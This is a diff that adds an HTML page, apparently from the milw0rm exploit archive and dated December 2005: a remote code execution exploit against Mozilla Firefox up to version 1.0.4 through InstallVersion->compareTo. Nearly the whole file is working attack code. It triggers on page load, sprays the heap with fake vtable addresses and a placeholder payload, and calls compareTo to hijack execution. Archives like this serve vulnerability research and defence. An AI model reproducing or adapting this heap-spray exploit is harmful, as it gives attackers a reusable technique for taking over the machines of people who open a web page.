@@ -1,0 +1,85 @@
+<html>
+<head>
+<!-- 
+     Copyright (C) 2005-2006 Aviv Raff
+     From: http://aviv.raffon.net/2005/12/11/MozillaUnderestimateVulnerabilityYetAgainPlusOldVulnerabilityNewExploit.aspx
+     Greets: SkyLined, The Insider and shutdown 
+-->
+	<title>Mozilla (Firefox<=v1.04) InstallVersion->compareTo Remote Code Execution Exploit</title>
+	<script language="javascript">
+
+		function BodyOnLoad() 
+		{
+			location.href="javascript:void (new InstallVersion());";
+			CrashAndBurn();
+		};
+
+		// The "Heap Spraying" is based on SkyLined InternetExploiter2 methodology
+		function CrashAndBurn() 
+		{
+			// Spray up to this address
+			var heapSprayToAddress=0x12000000;
+
+			// Payload - Just return..
+			var payLoadCode=unescape("%u9090%u90C3");
+
+			// Size of the heap blocks  
+			var heapBlockSize=0x400000;
+			
+			// Size of the payload in bytes
+			var payLoadSize=payLoadCode.length * 2; 
+			
+			// Caluclate spray slides size
+			var spraySlideSize=heapBlockSize-(payLoadSize+0x38); // exclude header
+
+			// Set first spray slide ("pdata") with "pvtbl" fake address - 0x11C0002C
+			var spraySlide1 = unescape("%u002C%u11C0"); 
+			//var spraySlide1 = unescape("%u7070%u7070"); // For testing
+			spraySlide1 = getSpraySlide(spraySlide1,spraySlideSize); 
+
+			var spraySlide2 = unescape("%u002C%u1200"); //0x1200002C 
+			//var spraySlide2 = unescape("%u8080%u8080"); // For testing
+			spraySlide2 = getSpraySlide(spraySlide2,spraySlideSize);
+
+			var spraySlide3 = unescape("%u9090%u9090");
+			spraySlide3 = getSpraySlide(spraySlide3,spraySlideSize);
+
+			// Spray the heap
+			heapBlocks=(heapSprayToAddress-0x400000)/heapBlockSize;
+			//alert(spraySlide2.length); return;
+			memory = new Array();
+			for (i=0;i<heapBlocks;i++) 
+			{
+				memory[i]=(i%3==0) ? spraySlide1 + payLoadCode: 
+						(i%3==1) ? spraySlide2 + payLoadCode: spraySlide3 + payLoadCode;
+			}
+
+			// Set address to fake "pdata".
+			var eaxAddress = 0x1180002C;
+			//	This was taken from shutdown's PoC in bugzilla
+			// struct vtbl { void (*code)(void); };
+			// struct data { struct vtbl *pvtbl; };
+			//
+			// struct data *pdata = (struct data *)(xxAddress & ~0x01);
+			// pdata->pvtbl->code(pdata);
+			//
+			(new InstallVersion).compareTo(new Number(eaxAddress >> 1));
+		}
+
+		function getSpraySlide(spraySlide, spraySlideSize) {
+			while (spraySlide.length*2<spraySlideSize) 
+			{
+				spraySlide+=spraySlide;
+			}	
+			spraySlide=spraySlide.substring(0,spraySlideSize/2);
+			return spraySlide;
+		}
+
+// -->
+	</script>
+</head>
+<body onload="BodyOnLoad()">
+</body>
+</html>
+
+# milw0rm.com [2005-12-12]
